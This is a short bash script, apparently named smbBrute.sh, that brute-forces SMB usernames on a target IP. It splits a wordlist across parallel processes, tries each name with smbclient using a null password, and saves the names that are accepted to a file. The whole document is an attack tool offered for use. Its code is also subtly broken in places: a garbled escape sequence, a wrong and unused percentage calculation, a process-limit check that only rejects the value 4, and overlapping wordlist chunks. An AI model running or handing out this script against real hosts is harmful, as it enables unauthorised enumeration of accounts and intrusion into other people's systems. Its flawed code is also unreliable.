#!/bin/bash


function bruteForce() {
lines="$(cat $2 | wc -l)"
num=0
list=$2
for i in $(cat "${list[@]}")
do
	smbclient -L $1 -U "$i" -N > /dev/null
	if [ $? -eq 0 ]
	then
		echo -e "\ŧ[+] User: $i\r"
		echo -e "$i" >> usersSMB.txt
	else
		echo -en "\t\t\t\t[-] User: $i\r"
	fi
	num=$(($num+1))
	percentaje=$(($num*100/$lines*100))

	echo -e "$3[$num / $lines]\r"
done
echo "Ended process $3"
}

if [ $# -gt 3 ] || [ $# -eq 0 ]
then
	echo "Only 3 arguments"
	echo "Usage: ./smbBrute.sh <IP> <list users> <processes>(optional: 2 default)"
	exit 1
fi
if [[ $1 = "-h" ]] || [[ $1 = "--help" ]]
then
	echo "Usage: ./smbBrute.sh <IP> <list users> <processes>(optional: 2 default)"
	exit 0
fi
if [[ $3 = "4" ]]
then
	echo "Max 4 proc"
	exit 1
fi
if [[ $3 = "" ]]
then
	proc=2
else
	proc=$(($3))
fi

total="$(cat $2 | wc -l)"
numList=$(($total/$proc))
n=0
n2=1
for i in $(seq $proc)
do
	n=$(($n+$numList))
	echo -e "$i -> n: $n\tn2:$n2"
	sed -n "${n2},${n}p" $2 > ./temp$i
	echo "Process: $i"
	bruteForce $1 ./temp$i $i &
	n2=$n
done

wait

rm ./temp*
